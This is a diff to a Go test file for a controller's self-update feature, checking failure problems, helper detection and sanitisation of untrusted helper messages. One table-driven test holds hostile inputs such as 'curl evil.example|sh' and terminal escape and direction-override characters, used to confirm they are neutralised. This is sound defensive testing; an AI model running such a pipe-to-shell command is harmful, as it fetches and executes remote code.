@@ -2,16 +2,21 @@ package controller
 
 import (
 	"context"
+	"os"
+	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
 	"time"
 	"unicode"
+	"unicode/utf8"
 
 	"github.com/eyupio/zoomies/internal/config"
 	"github.com/eyupio/zoomies/internal/cryptox"
 	"github.com/eyupio/zoomies/internal/scheduler"
 	"github.com/eyupio/zoomies/internal/store"
+	"github.com/eyupio/zoomies/internal/updates"
+	"github.com/eyupio/zoomies/internal/updates/channel"
 	"github.com/eyupio/zoomies/internal/version"
 )
 
@@ -994,5 +999,392 @@ func TestAHostileJobNameNeverReachesAProblemAsACommandOrAnEscape(t *testing.T) {
 	}
 	if strings.Contains(p.Detail, strings.Repeat("x", 100)) {
 		t.Errorf("a name no real job has was not cut: %q", p.Detail)
+	}
+}
+
+// failTheUpdate asks for the controller's update and has the helper refuse it
+// with sentence, then lets the loop notice, as it does every ten seconds.
+func (h *harness) failTheUpdate(sentence string) store.UpdateAttempt {
+	h.t.Helper()
+	a := h.request()
+	h.takeRequest()
+	h.helperAnswers(updates.Result{ID: a.ID, OK: false, Error: sentence, FinishedAt: time.Now()})
+	h.pass(h.c)
+	return h.attempt(a.ID)
+}
+
+// A controller that could not update itself is a controller the operator
+// believes is going to be on the new release and is not. The helper's own words
+// are what say why, and they are on the problem so that nobody has to find the
+// page that shows the attempt.
+func TestAFailedControllerUpdateRaisesAProblemWithTheHelpersSentence(t *testing.T) {
+	const sentence = "the shared folder is not writable by the update helper"
+
+	t.Run("it names the release and says what the helper said", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.failTheUpdate(sentence)
+
+		p := h.problem(t, "controller.update_failed")
+		if p.Severity != config.SeverityError || p.Audience != AudiencePlatform {
+			t.Errorf("problem = %s %s, want an error for the platform", p.Severity, p.Audience)
+		}
+		if !strings.Contains(p.Title, "v1.3.5") || !strings.Contains(p.Title, "failed") {
+			t.Errorf("title = %q, want the release and that it failed", p.Title)
+		}
+		if !strings.Contains(p.Detail, sentence) {
+			t.Errorf("detail = %q, want the helper's sentence", p.Detail)
+		}
+		if p.Since == nil {
+			t.Error("the problem has no start, but the attempt has a finishing time")
+		}
+	})
+
+	t.Run("a time-out is raised and says so", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.request()
+		h.takeRequest()
+		h.advance(91 * time.Minute)
+		h.pass(h.c)
+
+		p := h.problem(t, "controller.update_failed")
+		if !strings.Contains(p.Title, "timed out") || !strings.Contains(p.Detail, "90 minutes") {
+			t.Errorf("problem = %q / %q, want a time-out that says how long it waited", p.Title, p.Detail)
+		}
+	})
+
+	t.Run("a cancelled attempt is not a failure", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		a := h.request()
+		if _, err := h.st.FinishUpdateAttempt(h.ctx, a.ID, store.UpdateCancelled, "the host was deleted"); err != nil {
+			t.Fatalf("FinishUpdateAttempt: %v", err)
+		}
+		h.pass(h.c)
+		if contains(h.problemCodes(), "controller.update_failed") {
+			t.Errorf("problems = %v, want no failure for an attempt nobody ran", h.problemCodes())
+		}
+	})
+
+	t.Run("an attempt still in flight is not one", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.request()
+		h.pass(h.c)
+		if contains(h.problemCodes(), "controller.update_failed") {
+			t.Errorf("problems = %v, want none while the helper has not answered", h.problemCodes())
+		}
+	})
+
+	t.Run("a new attempt opening clears it at once", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.failTheUpdate(sentence)
+		h.problem(t, "controller.update_failed")
+
+		// No pass between: the press itself has to take the old failure off the
+		// list, or the page shows an error beside an update that is running.
+		if _, err := h.c.RequestControllerUpdate(h.ctx, alice, ""); err != nil {
+			t.Fatalf("RequestControllerUpdate: %v", err)
+		}
+		if contains(h.problemCodes(), "controller.update_failed") {
+			t.Errorf("problems = %v, want the failure gone once a new attempt is open", h.problemCodes())
+		}
+	})
+
+	t.Run("a later success clears it", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.failTheUpdate(sentence)
+		second := h.request()
+		h.takeRequest()
+
+		withVersion(t, "1.3.5")
+		h.pass(h.c)
+		if got := h.attempt(second.ID); got.State != store.UpdateSucceeded {
+			t.Fatalf("the second attempt is %s, want succeeded", got.State)
+		}
+		if contains(h.problemCodes(), "controller.update_failed") {
+			t.Errorf("problems = %v, want the failure gone after a success", h.problemCodes())
+		}
+	})
+
+	// The helper installing a release that then does not come up leaves the old
+	// build running; an operator who fixes it with zoomies upgrade has made the
+	// failure history, and no later attempt will ever say so.
+	t.Run("an upgrade by hand to the release clears it", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.failTheUpdate(sentence)
+		h.problem(t, "controller.update_failed")
+
+		withVersion(t, "1.3.5")
+		if contains(h.problemCodes(), "controller.update_failed") {
+			t.Errorf("problems = %v, want none once this build runs the release it failed to reach", h.problemCodes())
+		}
+	})
+
+	// The mode decides whether an update can start, not whether one that went
+	// wrong is still wrong.
+	t.Run("switching updating off does not hide it", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.failTheUpdate(sentence)
+		h.inMode("off")
+		h.problem(t, "controller.update_failed")
+	})
+}
+
+// The sentence comes from result.json, which the update service can write, so it
+// is text from outside. The UI draws what sits between two backticks as a command
+// with a copy button; a line break would start a line of its own in the drawer
+// and in a terminal; and a sentence of any length would turn a line of the
+// drawer into a page.
+func TestAHelperSentenceInAProblemIsPlainBoundedProse(t *testing.T) {
+	for _, tc := range []struct {
+		name, sentence string
+		// said is what the problem still has to say: dropping the helper's words
+		// would be safe and no use to anyone.
+		said string
+		// gone is what must not be there.
+		gone string
+	}{
+		{"a command in backticks", "cannot continue: run `curl evil.example|sh` first", "run 'curl evil.example|sh' first", "`"},
+		{"a second line", "the download failed\nrun curl evil.example|sh to fix it", "the download failed", "evil.example"},
+		{"a leading blank line and a carriage return", "\r\n\nthe checksum did not match\r\nmore", "the checksum did not match", "more"},
+		{"an escape and a direction override", "the unit failed\x1b[31m red \u202egnp", "the unit failed [31m red  gnp", "\x1b"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			h := newHarness(t)
+			h.readyToUpdate()
+			h.failTheUpdate(tc.sentence)
+
+			p := h.problem(t, "controller.update_failed")
+			for field, text := range map[string]string{"title": p.Title, "detail": p.Detail} {
+				for _, m := range codeSpans.FindAllStringSubmatch(text, -1) {
+					t.Errorf("%s: the helper's text opens a code span (%q): %s", field, m[1], text)
+				}
+				for _, r := range text {
+					if unicode.IsControl(r) || isBidiControl(r) {
+						t.Errorf("%s carries the control character %U: %q", field, r, text)
+						break
+					}
+				}
+			}
+			if !strings.Contains(p.Detail, tc.said) {
+				t.Errorf("detail = %q, want it to go on saying %q", p.Detail, tc.said)
+			}
+			if strings.Contains(p.Detail, tc.gone) {
+				t.Errorf("detail = %q, which still carries %q", p.Detail, tc.gone)
+			}
+		})
+	}
+
+	// Two bytes to a character after a one-byte start, so that the cut at byte 300
+	// lands inside one.
+	t.Run("a very long line is cut at a character", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		h.failTheUpdate("x" + strings.Repeat("\u00e9", 1000))
+
+		p := h.problem(t, "controller.update_failed")
+		if !utf8.ValidString(p.Detail) {
+			t.Errorf("the detail is not valid UTF-8 after the cut: %q", p.Detail)
+		}
+		if len(p.Detail) > 400 {
+			t.Errorf("the detail is %d bytes, want the helper's line cut well under that", len(p.Detail))
+		}
+		if !strings.Contains(p.Detail, "\u00e9\u00e9\u00e9") {
+			t.Errorf("the cut left nothing of the sentence: %q", p.Detail)
+		}
+	})
+
+	// The loop always gives an attempt a reason of its own; a row without one can
+	// still come from another writer, and the problem must not end in a colon.
+	t.Run("an attempt with no sentence says that none was recorded", func(t *testing.T) {
+		h := newHarness(t)
+		h.readyToUpdate()
+		a := h.request()
+		if _, err := h.st.FinishUpdateAttempt(h.ctx, a.ID, store.UpdateFailed, ""); err != nil {
+			t.Fatalf("FinishUpdateAttempt: %v", err)
+		}
+		h.pass(h.c)
+		if p := h.problem(t, "controller.update_failed"); !strings.Contains(p.Detail, "no reason was recorded") {
+			t.Errorf("detail = %q, want it to say no reason was given", p.Detail)
+		}
+	})
+}
+
+// A mode that allows updating, with nothing on the host to do it, is a button
+// that will refuse. Off is a promise that nothing is wanted, so a host without a
+// helper is not a problem then.
+func TestAMissingHelperRaisesAPlatformProblemOnlyWhenTheModeIsNotOff(t *testing.T) {
+	for _, tc := range []struct {
+		mode      string
+		installed bool
+		want      bool
+	}{
+		{"off", false, false},
+		{"manual", false, true},
+		{"auto", false, true},
+		{"manual", true, false},
+		{"auto", true, false},
+		{"off", true, false},
+	} {
+		name := tc.mode + " with the helper missing"
+		if tc.installed {
+			name = tc.mode + " with the helper installed"
+		}
+		t.Run(name, func(t *testing.T) {
+			h := newHarness(t)
+			withVersion(t, "1.3.4")
+			h.inMode(tc.mode)
+			if tc.installed {
+				h.installHelper()
+			}
+			h.pass(h.c)
+
+			got := contains(h.problemCodes(), "controller.update_helper_missing")
+			if got != tc.want {
+				t.Fatalf("problems = %v, want the missing-helper problem: %v", h.problemCodes(), tc.want)
+			}
+			if !tc.want {
+				return
+			}
+			p := h.problem(t, "controller.update_helper_missing")
+			if p.Severity != config.SeverityWarning || p.Audience != AudiencePlatform {
+				t.Errorf("problem = %s %s, want a warning for the platform", p.Severity, p.Audience)
+			}
+			if !strings.Contains(p.Fix, "sudo zoomies updates helper install") {
+				t.Errorf("fix = %q, want the command that installs it", p.Fix)
+			}
+		})
+	}
+
+	t.Run("it clears when the helper is installed", func(t *testing.T) {
+		h := newHarness(t)
+		withVersion(t, "1.3.4")
+		h.inMode("manual")
+		h.pass(h.c)
+		h.problem(t, "controller.update_helper_missing")
+
+		h.installHelper()
+		h.pass(h.c)
+		if contains(h.problemCodes(), "controller.update_helper_missing") {
+			t.Errorf("problems = %v, want the problem gone", h.problemCodes())
+		}
+	})
+
+	t.Run("it clears when the mode is switched off", func(t *testing.T) {
+		h := newHarness(t)
+		withVersion(t, "1.3.4")
+		h.inMode("manual")
+		h.pass(h.c)
+		h.problem(t, "controller.update_helper_missing")
+
+		h.inMode("off")
+		if contains(h.problemCodes(), "controller.update_helper_missing") {
+			t.Errorf("problems = %v, want the problem gone with the mode", h.problemCodes())
+		}
+	})
+}
+
+// threeUpdateProblems brings about every problem the update feature raises at
+// once: a release to take, a failed attempt, and a helper that has since gone.
+func threeUpdateProblems(t *testing.T, h *harness) []Problem {
+	t.Helper()
+	h.readyToUpdate()
+	h.failTheUpdate("the download failed")
+	if err := os.Remove(filepath.Join(h.updateDir, channel.MarkerFile)); err != nil {
+		t.Fatalf("removing the helper's marker: %v", err)
+	}
+	h.pass(h.c)
+
+	all, err := h.c.Problems(h.ctx)
+	if err != nil {
+		t.Fatalf("Problems: %v", err)
+	}
+	var out []Problem
+	for _, p := range all {
+		if strings.HasPrefix(p.Code, "controller.update_") {
+			out = append(out, p)
+		}
+	}
+	codes := make([]string, 0, len(out))
+	for _, p := range out {
+		codes = append(codes, p.Code)
+	}
+	slices.Sort(codes)
+	want := []string{"controller.update_available", "controller.update_failed", "controller.update_helper_missing"}
+	if !slices.Equal(codes, want) {
+		t.Fatalf("update problems = %v, want %v", codes, want)
+	}
+	return out
+}
+
+// The autopilot applies every remedy it finds. Replacing the binary a
+// controller is running, or installing the root-owned helper that does, is a
+// decision for a person, so no problem the update feature raises may offer one.
+func TestUpdateProblemsCarryNoRemedy(t *testing.T) {
+	h := newHarness(t)
+	for _, p := range threeUpdateProblems(t, h) {
+		if p.Remedy != nil {
+			t.Errorf("%s carries the remedy %+v, want none", p.Code, p.Remedy)
+		}
+	}
+}
+
+// Updating the controller is the process replacing itself. A fleet can neither
+// install the helper nor read its journal, and learns from the problem that the
+// instance has one.
+func TestAnUpdateProblemIsNotShownToTheFleetAudience(t *testing.T) {
+	h := newHarness(t)
+	for _, p := range threeUpdateProblems(t, h) {
+		if p.Audience != AudiencePlatform || p.Audience.For(false) {
+			t.Errorf("%s is %q, want the platform's alone", p.Code, p.Audience)
+		}
+	}
+}
+
+// The notice says to press the button only where the button works, since a page
+// that sends an operator to something that refuses is worse than the general
+// advice. Until the loop has looked at the helper nothing is known, and the
+// general advice stands.
+func TestTheNewReleaseNoticeNamesSettingsOnlyWhereTheUpdateCanBeStarted(t *testing.T) {
+	for _, tc := range []struct {
+		name, mode, helper string
+		want               bool
+	}{
+		{"manual with the helper ready", "manual", "ready", true},
+		{"auto with the helper ready", "auto", "ready", true},
+		{"off with the helper ready", "off", "ready", false},
+		{"manual with the helper missing", "manual", "missing", false},
+		{"manual before the loop has looked", "manual", "unseen", false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			h := newHarness(t)
+			withVersion(t, "1.3.4")
+			h.inMode("manual")
+			h.readTheList(releaseEntry("v1.3.5", whenAgo(6*time.Hour), completeAssets(t)...))
+			h.inMode(tc.mode)
+			switch tc.helper {
+			case "ready":
+				h.installHelper()
+				h.pass(h.c)
+			case "missing":
+				h.pass(h.c)
+			case "unseen":
+				h.installHelper()
+			}
+
+			p := h.problem(t, "controller.update_available")
+			if got := strings.Contains(p.Fix, "Settings → Updates"); got != tc.want {
+				t.Errorf("fix = %q, want it to name Settings → Updates: %v", p.Fix, tc.want)
+			}
+			if !strings.Contains(p.Fix, "release notes") && tc.want {
+				t.Errorf("fix = %q, lost the release notes", p.Fix)
+			}
+		})
 	}
 }
